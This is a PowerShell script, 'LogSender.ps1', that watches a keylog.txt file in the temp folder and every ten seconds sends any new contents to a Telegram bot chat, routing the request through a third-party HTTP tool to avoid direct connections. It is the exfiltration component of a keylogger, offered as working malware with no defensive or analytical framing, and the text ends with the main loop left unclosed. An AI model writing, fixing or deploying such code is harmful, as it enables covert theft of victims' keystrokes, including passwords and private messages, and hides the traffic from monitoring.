# Fixed LogSender.ps1
$logFile = "$env:temp\keylog.txt"
$lastContent = ""
$firstRun = $true

function Send-LogContent {
    param (
        [string]$content
    )
    
    if (-not [string]::IsNullOrEmpty($content)) {
        try {
            # Trim the content to reasonable length and clean it
            $cleanContent = $content.Trim() -replace "[^\p{L}\p{N}\p{P}\p{S}\s]", ""
            
            # Prepare Telegram API URL with escaped content
            $telegramUrl = "https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={admin_chat_id}&text=$([System.Uri]::EscapeDataString($cleanContent))"
            
            # Send through HTTP Debugger to avoid direct connections
            $response = Invoke-WebRequest -Uri "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx" -Method Post -Body @{
                "UrlBox" = $telegramUrl
                "AgentList" = "Mozilla Firefox"
                "VersionsList" = "HTTP/1.1"
                "MethodList" = "POST"
            } -ContentType "application/x-www-form-urlencoded" -TimeoutSec 5
            
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Logs sent to Telegram ($($cleanContent.Length) chars)"
            return $true
        }
        catch {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Error sending logs: $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    }
}

Write-Host "Starting log sender. Press Ctrl+C to stop."
Write-Host "Monitoring file: $logFile"
Write-Host "Sending logs to Telegram"

# Main loop
while ($true) {
    if (Test-Path $logFile) {
        try {
            $currentContent = Get-Content $logFile -Raw -ErrorAction Stop
            
            # Only send if content has changed or it's the first run
            if ($currentContent -ne $lastContent -or $firstRun) {
                $firstRun = $false
                
                if (Send-LogContent -content $currentContent) {
                    $lastContent = $currentContent
                }
            }
        }
        catch {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Error reading log file: $_" -ForegroundColor Yellow
        }
    }
    else {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Log file not found. Waiting..." -ForegroundColor DarkGray
    }
    
    # Wait 10 seconds before checking again
    Start-Sleep -Seconds 10